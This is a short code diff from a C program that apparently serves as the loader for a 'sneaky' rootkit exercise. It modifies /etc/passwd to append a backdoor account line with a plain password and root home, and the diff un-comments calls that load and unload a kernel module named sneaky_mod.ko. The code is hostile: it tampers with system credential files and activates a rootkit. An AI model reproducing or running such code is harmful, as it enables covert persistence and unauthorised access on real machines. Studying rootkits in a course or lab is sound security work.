@@ -46,13 +46,13 @@ int main() {
 
   copy_file("/etc/passwd", "/tmp/passwd");
   add_passwd("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
-  //  system("insmod sneaky_mod.ko");
+  system("insmod sneaky_mod.ko");
 
   char c;
   while ((c = getchar()) != 'q') {
   }
 
-  // system("rmmod sneaky_mod.ko");
+  system("rmmod sneaky_mod.ko");
   copy_file("/tmp/passwd", "/etc/passwd");
   system("rm /tmp/passwd"); 
   return EXIT_SUCCESS;
